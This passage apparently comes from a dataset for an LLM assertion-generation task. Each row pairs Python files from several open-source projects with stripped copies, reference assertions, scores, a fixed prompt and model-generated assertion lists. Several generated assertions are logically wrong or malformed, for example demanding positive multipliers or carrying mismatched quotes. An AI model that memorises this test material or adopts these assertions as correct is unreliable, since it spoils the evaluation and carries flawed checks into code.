25# A PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR
26# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
27# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
28# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
29# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
30# LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
31# NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
32# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
33
34import Point as pt
35
36try:
37    import opencv as cv
38except:
39    import cv
40def BoundingRect(*points):
41    '''
42    Create a rectangle that includes all of the points.
43    '''
44    tmp = []
45    for each in points:
46        if type(each) == list or type(each) == tuple:
47            tmp += each
48        else:
49            tmp.append(each)
50    minx = maxx = tmp[0].X()
51    miny = maxy = tmp[0].Y()
52    for each in tmp:
53        minx = min(minx,each.X())
54        maxx = max(maxx,each.X())
55        miny = min(miny,each.Y())
56        maxy = max(maxy,each.Y())
57    return Rect(minx,miny,maxx-minx,maxy-miny)
58
59
60class Rect:
61    '''
62    This is a simple structure that represents a rectangle.
63    '''
64    
65    def __init__(self,x=0.0,y=0.0,w=0.0,h=0.0):
66        ''' 
67        Initialize a rectangle instance.
68        
69        Arguments:
70        @param x: top left x coordinate
71        @param y: top left y coordinate
72        @param w: width
73        @param h: height
74        '''
75        self.x = float(x)
76        self.y = float(y)
77        self.w = float(w)
78        self.h = float(h)
79        
80    def intersect(self, rect):
81        '''
82        Compute the intersection of two rectangles.
83        
84        @returns: a rectangle representing the intersection.
85        '''
86        r1 = self
87        r2 = rect
88        
89        r1_x1 = r1.x
90        r1_x2 = r1.x + r1.w
91        r1_y1 = r1.y
92        r1_y2 = r1.y + r1.h
93
94        r2_x1 = r2.x
95        r2_x2 = r2.x + r2.w
96        r2_y1 = r2.y
97        r2_y2 = r2.y + r2.h
98        
99        #print r1_x1,r1_x2,r1_y1,r1_y2
100        #print r2_x1,r2_x2,r2_y1,r2_y2
101        
102        r3_x1 = max(r1_x1,r2_x1)
103        r3_x2 = min(r1_x2,r2_x2)
104        r3_y1 = max(r1_y1,r2_y1)
105        r3_y2 = min(r1_y2,r2_y2)
106
107        #print r3_x1,r3_x2,r3_y1,r3_y2
108        
109        r3_w = r3_x2-r3_x1
110        r3_h = r3_y2-r3_y1
111        
112        if r3_w < 0.0 or r3_h < 0.0:
113            return None
114        
115        return Rect(r3_x1,r3_y1,r3_w, r3_h)
116    
117    def containsPoint(self,point):
118        '''
119        Determine if a point is within a rectangle.
120        
121        @param point: an object of type pv.Point.
122        @returns: True if the point is withen the Rect.
123        '''
124        x = point.X()
125        y = point.Y()
126        
127        return x >= self.x and x <= self.x+self.w and y >= self.y and y <= self.y + self.h
128        
129    def center(self):
130        '''
131        Compute and return a point at the center of the rectangle
132        
133        @returns: a pv.Point at the center.
134        '''
135        return pt.Point(self.x+0.5*self.w,self.y+0.5*self.h)
136    
137    def area(self):
138        '''
139        @returns: the area of the rect
140        '''
141        return self.w*self.h
142    
143    def __str__(self):
144        '''
145        @returns: a string representing this rectangle
146        '''
147        return ""Rect(%f,%f,%f,%f)""%(self.x,self.y,self.w,self.h)
148    
149    def box(self):
150        '''
151        Get this rectangle as a bounding box as expected by many PIL functions.
152        
153        @returns: tuple of (left,top,right,bottom)
154        '''
155        return int(round(self.x)), int(round(self.y)), int(round(self.x+self.w)), int(round(self.y+self.h))
156
157    def asOpenCV(self):
158        '''
159        Returns a representation compatible with opencv.
160        '''
161        return (int(round(self.x)),int(round(self.y)),int(round(self.w)),int(round(self.h)))
162
163    def __mul__(self,val):
164        '''
165        Multiply the rectangle by a constant.
166        '''
167        if isinstance(val,float) or isinstance(val,int): 
168            return Rect(self.x*val,self.y*val,self.w*val,self.h*val)
169
170    def __rmul__(self,val):
171        '''
172        Multiply the rectangle by a constant.
173        '''
174        if isinstance(val,float) or isinstance(val,int): 
175            return Rect(self.x*val,self.y*val,self.w*val,self.h*val)
176
177
178def test():
179    '''
180    '''
181    import Point
182    p1 = Point.Point(1,1)
183    p2 = Point.Point(4,4)
184    p3 = Point.Point(5,4)
185    p4 = Point.Point(6,8)
186
187    r1 = BoundingRect(p1,p2)
188    r2 = BoundingRect(p3,p4)
189    r3 = Rect(3,3,3,3)
190    print r1
191    print r2
192    print r1.intersect(r2)
193    print r3.intersect(r2)
194    
195if __name__ == ""__main__"":
196    test()
197
198
199",7873,"[40, '*points', '!=', 0, ""The function needs at least one point to make a rectangle""],
[44, 'tmp', '==', 0, ""temp list that will store points should be initially empty""],
[46, '*points', '!=', 'None', ""the point list should not contain null values""],
[50, 'maxx', '>=', 'minx', ""max x-coordinate should always be greater or equal to min x-coordinate""],
[56, 'maxy', '>=', 'miny', ""max y-coordinate should always be greater or equal to min y-coordinate""],
[64, '*points', '>=', 0, ""all coordinates should be greater or equal to 0""],
[75, 'self.x', '>=', 0, ""coordinate x should be a positive value""],
[76, 'self.y', '>=', 0, ""coordinate y should be a positive value""],
[77, 'self.w', '>=', 0, ""width should be a positive value""],
[78, 'self.h', '>=', 0, ""height should be a positive value""],
[103, 'r3_x1', '<=', 'r3_x2',  ""top x-coordinate should be lesser or equal to bottom x-coordinate in the intersect rectangle r3""],
[105, 'r3_y1', '<=', 'r3_y2',  ""left y-coordinate should be less or equal to right y-coordinate in the intersect rectangle r3""],
[112, 'r3_w', '>=', 0, ""width of intersect rectangle should not be negative""],
[112, 'r3_h', '>=', 0, ""height of intersect rectangle should not be negative""],
[124, 'x', '>=', 'self.x', 'point should be inside or on the edge of the rectangle'],
[125, 'y', '>=', 'self.y', 'point should be inside or on the edge of the rectangle""],
[127, 'x', '<=', 'self.x+self.w', 'point should be inside or on the edge of the rectangle'],
[127, 'y', '<=', 'self.y+self.h', 'point should be inside or on the edge of the rectangle'],
[141, 'self.w', '>=', 0, 'width of the rectangle should be a non-negative value'],
[141, 'self.h', '>=', 0, 'height of the rectangle should be a non-negative value'],
[167, 'val', '!=', 0, 'value used for multiplication should not be 0'],
[167, 'val', '>=', 0, 'value used for multiplication should be positive'],
[174, 'val', '!=', 0, 'value used for multiplication should not be 0'],
[174, 'val', '>=', 0, 'value used for multiplication should be positive']"
scop/bash-completion,"import pytest


@pytest.mark.bashcomp(cmd=""munin-node-configure"")
class TestMuninNodeConfigure:
    @pytest.mark.complete(""munin-node-configure --libdir "")
    def test_1(self, completion):
        assert completion

    @pytest.mark.complete(
        ""munin-node-configure -"",
        require_cmd=True,
        xfail=(
            ""! (munin-node-configure --help 2>&1 || :) ""
            ""| command grep -q -- '[[:space:]]-'""
        ),
    )
    def test_2(self, completion):
        assert completion
","
1import pytest
2
3
4@pytest.mark.bashcomp(cmd=""munin-node-configure"")
5class TestMuninNodeConfigure:
6    @pytest.mark.complete(""munin-node-configure --libdir "")
7    def test_1(self, completion):
8
9    @pytest.mark.complete(
10        ""munin-node-configure -"",
11        require_cmd=True,
12        xfail=(
13            ""! (munin-node-configure --help 2>&1 || :) ""
14            ""| command grep -q -- '[[:space:]]-'""
15        ),
16    )
17    def test_2(self, completion):
18","[['completion', '==', 'True'], ['completion', '==', 'True']]",2,2,1.0,0.0039682539682539,['completion'],1,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['completion']
*Code:

1import pytest
2
3
4@pytest.mark.bashcomp(cmd=""munin-node-configure"")
5class TestMuninNodeConfigure:
6    @pytest.mark.complete(""munin-node-configure --libdir "")
7    def test_1(self, completion):
8
9    @pytest.mark.complete(
10        ""munin-node-configure -"",
11        require_cmd=True,
12        xfail=(
13            ""! (munin-node-configure --help 2>&1 || :) ""
14            ""| command grep -q -- '[[:space:]]-'""
15        ),
16    )
17    def test_2(self, completion):
18",1874,"[[7, 'completion', '!=', None, 'completion should not be None'],
[17, 'completion', '!=', None, 'completion should not be None']]"
frankrousseau/weboob,"# -*- coding: utf-8 -*-

# Copyright(C) 2013 Julien Veyssier
#
# This file is part of weboob.
#
# weboob is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# weboob is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with weboob. If not, see <http://www.gnu.org/licenses/>.

from weboob.tools.test import BackendTest

from random import choice


class TvsubtitlesTest(BackendTest):
    MODULE = 'tvsubtitles'

    def test_subtitle(self):
        subtitles = list(self.backend.iter_subtitles('fr', 'sopranos'))
        assert (len(subtitles) > 0)
        for subtitle in subtitles:
            assert subtitle.url.startswith('http')

        # get the file of a random sub
        if len(subtitles):
            subtitle = choice(subtitles)
            self.backend.get_subtitle_file(subtitle.id)

    def test_get_subtitle(self):
        subtitles = list(self.backend.iter_subtitles('fr', 'sopranos'))
        assert (len(subtitles) > 0)
        subtitle = choice(subtitles)
        assert self.backend.get_subtitle(subtitle.id)
","
1# -*- coding: utf-8 -*-
2
3# Copyright(C) 2013 Julien Veyssier
4#
5# This file is part of weboob.
6#
7# weboob is free software: you can redistribute it and/or modify
8# it under the terms of the GNU Affero General Public License as published by
9# the Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# weboob is distributed in the hope that it will be useful,
13# but WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
15# GNU Affero General Public License for more details.
16#
17# You should have received a copy of the GNU Affero General Public License
18# along with weboob. If not, see <http://www.gnu.org/licenses/>.
19
20from weboob.tools.test import BackendTest
21
22from random import choice
23
24
25class TvsubtitlesTest(BackendTest):
26    MODULE = 'tvsubtitles'
27
28    def test_subtitle(self):
29        subtitles = list(self.backend.iter_subtitles('fr', 'sopranos'))
30        for subtitle in subtitles:
31
32        # get the file of a random sub
33        if len(subtitles):
34            subtitle = choice(subtitles)
35            self.backend.get_subtitle_file(subtitle.id)
36
37    def test_get_subtitle(self):
38        subtitles = list(self.backend.iter_subtitles('fr', 'sopranos'))
39        subtitle = choice(subtitles)
40","[['(len(subtitles)', '>', '0)'], [""subtitle.url.startswith('http')"", '==', 'True'], ['(len(subtitles)', '>', '0)'], ['self.backend.get_subtitle(subtitle.id)', '==', 'True']]",4,4,1.0,0.0026899798251513,"['MODULE', 'subtitles', 'subtitle']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['MODULE', 'subtitles', 'subtitle']
*Code:

1# -*- coding: utf-8 -*-
2
3# Copyright(C) 2013 Julien Veyssier
4#
5# This file is part of weboob.
6#
7# weboob is free software: you can redistribute it and/or modify
8# it under the terms of the GNU Affero General Public License as published by
9# the Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# weboob is distributed in the hope that it will be useful,
13# but WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
15# GNU Affero General Public License for more details.
16#
17# You should have received a copy of the GNU Affero General Public License
18# along with weboob. If not, see <http://www.gnu.org/licenses/>.
19
20from weboob.tools.test import BackendTest
21
22from random import choice
23
24
25class TvsubtitlesTest(BackendTest):
26    MODULE = 'tvsubtitles'
27
28    def test_subtitle(self):
29        subtitles = list(self.backend.iter_subtitles('fr', 'sopranos'))
30        for subtitle in subtitles:
31
32        # get the file of a random sub
33        if len(subtitles):
34            subtitle = choice(subtitles)
35            self.backend.get_subtitle_file(subtitle.id)
36
37    def test_get_subtitle(self):
38        subtitles = list(self.backend.iter_subtitles('fr', 'sopranos'))
39        subtitle = choice(subtitles)
40",2797,"[[29, 'subtitles', '!=', None, ""subtitles must be initialized""], 
 [34, 'subtitles', '>=', 1, ""there must be at least one subtitle for choice() to work""],
 [39, 'subtitles', '!=', None, ""subtitles must be initialized""],
 [39, 'subtitles', '>=', 1, ""there must be at least one subtitle for choice() to work""]]"
janhui/test_engine,"import os, sys, ntpath

sys.path.append(os.path.abspath(os.path.dirname(__file__) + '/testing_modules/'))
from file_generation import generate_files, make_directory

sys.path.append(os.path.abspath(os.path.dirname(__file__) + '/testing_modules/'))

from test_msh import mesh_file_test
from test_geo import geo_files_test


test = os.path.dirname(os.path.realpath(__file__)) + ""/output""
support_file_path = os.path.dirname(os.path.realpath(__file__)) + ""/support""



fname = ""test_annulus_BSplines_Compound_lines_coarse_metric""
command = ""--line BY -g ""+test+""/test_annulus_BSplines_Compound_lines_coarse_metric/test_annulus_BSplines_Compound_lines_coarse_metric.geo ""+support_file_path+""/annulus.shp --mesh -m ""+support_file_path+""/gaussian_bump_coarse.nc""


generate_files(fname, command)



def test_annulus_bn_geo():
	curr_file = os.path.dirname(os.path.realpath(__file__)) + ""/output/"" + fname + ""/"" + fname + "".geo""

	assert geo_files_test(curr_file),""%s does not match the model answer"" % (ntpath.basename(curr_file).rstrip())


def test_annulus_bn_msh():
	curr_file = os.path.dirname(os.path.realpath(__file__)) + ""/output/"" + fname + ""/"" + fname + "".msh""

	assert mesh_file_test(curr_file),""%s does not match the model answer"" % (ntpath.basename(curr_file).rstrip())
","
1import os, sys, ntpath
2
3sys.path.append(os.path.abspath(os.path.dirname(__file__) + '/testing_modules/'))
4from file_generation import generate_files, make_directory
5
6sys.path.append(os.path.abspath(os.path.dirname(__file__) + '/testing_modules/'))
7
8from test_msh import mesh_file_test
9from test_geo import geo_files_test
10
11
12test = os.path.dirname(os.path.realpath(__file__)) + ""/output""
13support_file_path = os.path.dirname(os.path.realpath(__file__)) + ""/support""
14
15
16
17fname = ""test_annulus_BSplines_Compound_lines_coarse_metric""
18command = ""--line BY -g ""+test+""/test_annulus_BSplines_Compound_lines_coarse_metric/test_annulus_BSplines_Compound_lines_coarse_metric.geo ""+support_file_path+""/annulus.shp --mesh -m ""+support_file_path+""/gaussian_bump_coarse.nc""
19
20
21generate_files(fname, command)
22
23
24
25def test_annulus_bn_geo():
26	curr_file = os.path.dirname(os.path.realpath(__file__)) + ""/output/"" + fname + ""/"" + fname + "".geo""
27
28
29
30def test_annulus_bn_msh():
31	curr_file = os.path.dirname(os.path.realpath(__file__)) + ""/output/"" + fname + ""/"" + fname + "".msh""
32
33","[['geo_files_test(curr_file)', '==', 'True'], ['mesh_file_test(curr_file)', '==', 'True']]",2,2,1.0,0.0015686274509803,"['test', 'support_file_path', 'fname', 'command', 'curr_file']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['test', 'support_file_path', 'fname', 'command', 'curr_file']
*Code:

1import os, sys, ntpath
2
3sys.path.append(os.path.abspath(os.path.dirname(__file__) + '/testing_modules/'))
4from file_generation import generate_files, make_directory
5
6sys.path.append(os.path.abspath(os.path.dirname(__file__) + '/testing_modules/'))
7
8from test_msh import mesh_file_test
9from test_geo import geo_files_test
10
11
12test = os.path.dirname(os.path.realpath(__file__)) + ""/output""
13support_file_path = os.path.dirname(os.path.realpath(__file__)) + ""/support""
14
15
16
17fname = ""test_annulus_BSplines_Compound_lines_coarse_metric""
18command = ""--line BY -g ""+test+""/test_annulus_BSplines_Compound_lines_coarse_metric/test_annulus_BSplines_Compound_lines_coarse_metric.geo ""+support_file_path+""/annulus.shp --mesh -m ""+support_file_path+""/gaussian_bump_coarse.nc""
19
20
21generate_files(fname, command)
22
23
24
25def test_annulus_bn_geo():
26	curr_file = os.path.dirname(os.path.realpath(__file__)) + ""/output/"" + fname + ""/"" + fname + "".geo""
27
28
29
30def test_annulus_bn_msh():
31	curr_file = os.path.dirname(os.path.realpath(__file__)) + ""/output/"" + fname + ""/"" + fname + "".msh""
32
33",2553,"[[13, 'test', '!=', '', 'Path for test folder should not be an empty string'],
[14, 'support_file_path', '!=', '', 'Path for support file should not be an empty string'],
[17, 'fname', '!=', '', 'The file name should not be an empty string'],
[18, 'command', '!=', '', 'Command for generating files should not be an empty string'],
[26, 'curr_file', '!=', '', 'Current file path should not be an empty string'],
[31, 'curr_file', '!=', '', 'Current file path should not be an empty string']]"
shubhamdhama/zulip,"import sys
from argparse import ArgumentParser
from typing import Any

from django.core.exceptions import ValidationError
from django.db.utils import IntegrityError

from zerver.lib.domains import validate_domain
from zerver.lib.management import CommandError, ZulipBaseCommand
from zerver.models import RealmDomain, get_realm_domains


class Command(ZulipBaseCommand):
    help = """"""Manage domains for the specified realm""""""

    def add_arguments(self, parser: ArgumentParser) -> None:
        parser.add_argument('--op',
                            dest='op',
                            type=str,
                            default=""show"",
                            help='What operation to do (add, show, remove).')
        parser.add_argument('--allow-subdomains',
                            dest='allow_subdomains',
                            action=""store_true"",
                            default=False,
                            help='Whether subdomains are allowed or not.')
        parser.add_argument('domain', metavar='<domain>', type=str, nargs='?',
                            help=""domain to add or remove"")
        self.add_realm_args(parser, True)

    def handle(self, *args: Any, **options: str) -> None:
        realm = self.get_realm(options)
        assert realm is not None  # Should be ensured by parser
        if options[""op""] == ""show"":
            print(f""Domains for {realm.string_id}:"")
            for realm_domain in get_realm_domains(realm):
                if realm_domain[""allow_subdomains""]:
                    print(realm_domain[""domain""] + "" (subdomains allowed)"")
                else:
                    print(realm_domain[""domain""] + "" (subdomains not allowed)"")
            sys.exit(0)

        domain = options['domain'].strip().lower()
        try:
            validate_domain(domain)
        except ValidationError as e:
            raise CommandError(e.messages[0])
        if options[""op""] == ""add"":
            try:
                RealmDomain.objects.create(realm=realm, domain=domain,
                                           allow_subdomains=options[""allow_subdomains""])
                sys.exit(0)
            except IntegrityError:
                raise CommandError(f""The domain {domain} is already a part ""
                                   ""of your organization."")
        elif options[""op""] == ""remove"":
            try:
                RealmDomain.objects.get(realm=realm, domain=domain).delete()
                sys.exit(0)
            except RealmDomain.DoesNotExist:
                raise CommandError(""No such entry found!"")
        else:
            self.print_help(""./manage.py"", ""realm_domain"")
            raise CommandError
","
1import sys
2from argparse import ArgumentParser
3from typing import Any
4
5from django.core.exceptions import ValidationError
6from django.db.utils import IntegrityError
7
8from zerver.lib.domains import validate_domain
9from zerver.lib.management import CommandError, ZulipBaseCommand
10from zerver.models import RealmDomain, get_realm_domains
11
12
13class Command(ZulipBaseCommand):
14    help = """"""Manage domains for the specified realm""""""
15
16    def add_arguments(self, parser: ArgumentParser) -> None:
17        parser.add_argument('--op',
18                            dest='op',
19                            type=str,
20                            default=""show"",
21                            help='What operation to do (add, show, remove).')
22        parser.add_argument('--allow-subdomains',
23                            dest='allow_subdomains',
24                            action=""store_true"",
25                            default=False,
26                            help='Whether subdomains are allowed or not.')
27        parser.add_argument('domain', metavar='<domain>', type=str, nargs='?',
28                            help=""domain to add or remove"")
29        self.add_realm_args(parser, True)
30
31    def handle(self, *args: Any, **options: str) -> None:
32        realm = self.get_realm(options)
33        if options[""op""] == ""show"":
34            print(f""Domains for {realm.string_id}:"")
35            for realm_domain in get_realm_domains(realm):
36                if realm_domain[""allow_subdomains""]:
37                    print(realm_domain[""domain""] + "" (subdomains allowed)"")
38                else:
39                    print(realm_domain[""domain""] + "" (subdomains not allowed)"")
40            sys.exit(0)
41
42        domain = options['domain'].strip().lower()
43        try:
44            validate_domain(domain)
45        except ValidationError as e:
46            raise CommandError(e.messages[0])
47        if options[""op""] == ""add"":
48            try:
49                RealmDomain.objects.create(realm=realm, domain=domain,
50                                           allow_subdomains=options[""allow_subdomains""])
51                sys.exit(0)
52            except IntegrityError:
53                raise CommandError(f""The domain {domain} is already a part ""
54                                   ""of your organization."")
55        elif options[""op""] == ""remove"":
56            try:
57                RealmDomain.objects.get(realm=realm, domain=domain).delete()
58                sys.exit(0)
59            except RealmDomain.DoesNotExist:
60                raise CommandError(""No such entry found!"")
61        else:
62            self.print_help(""./manage.py"", ""realm_domain"")
63            raise CommandError
64","[['realm', '==', 'not None']]",1,1,1.0,0.0003696857670979,"['help', 'parser: ArgumentParser', '*args: Any', '**options: str', 'realm', 'domain']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['help', 'parser: ArgumentParser', '*args: Any', '**options: str', 'realm', 'domain']
*Code:

1import sys
2from argparse import ArgumentParser
3from typing import Any
4
5from django.core.exceptions import ValidationError
6from django.db.utils import IntegrityError
7
8from zerver.lib.domains import validate_domain
9from zerver.lib.management import CommandError, ZulipBaseCommand
10from zerver.models import RealmDomain, get_realm_domains
11
12
13class Command(ZulipBaseCommand):
14    help = """"""Manage domains for the specified realm""""""
15
16    def add_arguments(self, parser: ArgumentParser) -> None:
17        parser.add_argument('--op',
18                            dest='op',
19                            type=str,
20                            default=""show"",
21                            help='What operation to do (add, show, remove).')
22        parser.add_argument('--allow-subdomains',
23                            dest='allow_subdomains',
24                            action=""store_true"",
25                            default=False,
26                            help='Whether subdomains are allowed or not.')
27        parser.add_argument('domain', metavar='<domain>', type=str, nargs='?',
28                            help=""domain to add or remove"")
29        self.add_realm_args(parser, True)
30
31    def handle(self, *args: Any, **options: str) -> None:
32        realm = self.get_realm(options)
33        if options[""op""] == ""show"":
34            print(f""Domains for {realm.string_id}:"")
35            for realm_domain in get_realm_domains(realm):
36                if realm_domain[""allow_subdomains""]:
37                    print(realm_domain[""domain""] + "" (subdomains allowed)"")
38                else:
39                    print(realm_domain[""domain""] + "" (subdomains not allowed)"")
40            sys.exit(0)
41
42        domain = options['domain'].strip().lower()
43        try:
44            validate_domain(domain)
45        except ValidationError as e:
46            raise CommandError(e.messages[0])
47        if options[""op""] == ""add"":
48            try:
49                RealmDomain.objects.create(realm=realm, domain=domain,
50                                           allow_subdomains=options[""allow_subdomains""])
51                sys.exit(0)
52            except IntegrityError:
53                raise CommandError(f""The domain {domain} is already a part ""
54                                   ""of your organization."")
55        elif options[""op""] == ""remove"":
56            try:
57                RealmDomain.objects.get(realm=realm, domain=domain).delete()
58                sys.exit(0)
59            except RealmDomain.DoesNotExist:
60                raise CommandError(""No such entry found!"")
61        else:
62            self.print_help(""./manage.py"", ""realm_domain"")
63            raise CommandError
64",4226,"[[17, 'op', '!=', None, ""Operation should not be None""],
 [27, 'domain', '!=', None, ""Domain should not be None""],
 [32, 'realm', '!=', None, ""Realm should not be None.""],
 [42, 'domain', '!=', '', ""Domain should not be an empty string""],
 [47, 'op', '==', 'add', ""Checking if operation is to add a domain""],
 [55, 'op', '==', 'remove', ""Checking if operation is remove a domain""]]"
kachick/topaz,"import copy

from rpython.rlib import jit

from topaz.objects.objectobject import W_Root


class VersionTag(object):
    def __deepcopy__(self, memo):
        memo[id(self)] = result = VersionTag()
        return result


class BaseCell(W_Root):
    pass


class Cell(BaseCell):
    def __init__(self, w_value):
        self.w_value = w_value

    def __deepcopy__(self, memo):
        obj = super(Cell, self).__deepcopy__(memo)
        obj.w_value = copy.deepcopy(self.w_value, memo)
        return obj

    def getvalue(self, space, name):
        return self.w_value

    def setvalue(self, space, name, w_value):
        self.w_value = w_value


class GetterSetterCell(BaseCell):
    _immutable_fields_ = [""getter"", ""setter""]

    def __init__(self, getter, setter=None):
        self.getter = getter
        self.setter = setter

    def __deepcopy__(self, memo):
        obj = super(GetterSetterCell, self).__deepcopy__(memo)
        obj.getter = copy.deepcopy(self.getter, memo)
        obj.setter = copy.deepcopy(self.setter, memo)
        return obj

    def getvalue(self, space, name):
        return self.getter(space)

    def setvalue(self, space, name, w_value):
        if self.setter is None:
            raise space.error(space.w_NameError,
                ""%s is a read-only variable"" % name
            )
        self.setter(space, w_value)


class CellDict(object):
    _immutable_fields_ = [""version?""]

    def __init__(self):
        self.values = {}
        self.version = VersionTag()

    def __deepcopy__(self, memo):
        c = object.__new__(self.__class__)
        c.values = copy.deepcopy(self.values, memo)
        c.version = copy.deepcopy(self.version, memo)
        return c

    def __iter__(self):
        return iter(self.values)

    def mutated(self):
        self.version = VersionTag()

    @jit.elidable
    def _get_cell(self, name, version):
        assert version is self.version
        return self.values.get(name, None)

    def get(self, space, name):
        cell = self._get_cell(name, self.version)
        if isinstance(cell, BaseCell):
            return cell.getvalue(space, name)
        else:
            return cell

    def set(self, space, name, w_value):
        cell = self._get_cell(name, self.version)
        if isinstance(cell, BaseCell):
            cell.setvalue(space, name, w_value)
        else:
            if cell is not None:
                w_value = Cell(w_value)
            self.mutated()
            self.values[name] = w_value

    def delete(self, name):
        try:
            del self.values[name]
        except KeyError:
            pass
        else:
            self.mutated()


class GlobalsDict(CellDict):
    def define_virtual(self, name, getter, setter=None):
        self.mutated()
        self.values[name] = GetterSetterCell(getter, setter)
","
1import copy
2
3from rpython.rlib import jit
4
5from topaz.objects.objectobject import W_Root
6
7
8class VersionTag(object):
9    def __deepcopy__(self, memo):
10        memo[id(self)] = result = VersionTag()
11        return result
12
13
14class BaseCell(W_Root):
15    pass
16
17
18class Cell(BaseCell):
19    def __init__(self, w_value):
20        self.w_value = w_value
21
22    def __deepcopy__(self, memo):
23        obj = super(Cell, self).__deepcopy__(memo)
24        obj.w_value = copy.deepcopy(self.w_value, memo)
25        return obj
26
27    def getvalue(self, space, name):
28        return self.w_value
29
30    def setvalue(self, space, name, w_value):
31        self.w_value = w_value
32
33
34class GetterSetterCell(BaseCell):
35    _immutable_fields_ = [""getter"", ""setter""]
36
37    def __init__(self, getter, setter=None):
38        self.getter = getter
39        self.setter = setter
40
41    def __deepcopy__(self, memo):
42        obj = super(GetterSetterCell, self).__deepcopy__(memo)
43        obj.getter = copy.deepcopy(self.getter, memo)
44        obj.setter = copy.deepcopy(self.setter, memo)
45        return obj
46
47    def getvalue(self, space, name):
48        return self.getter(space)
49
50    def setvalue(self, space, name, w_value):
51        if self.setter is None:
52            raise space.error(space.w_NameError,
53                ""%s is a read-only variable"" % name
54            )
55        self.setter(space, w_value)
56
57
58class CellDict(object):
59    _immutable_fields_ = [""version?""]
60
61    def __init__(self):
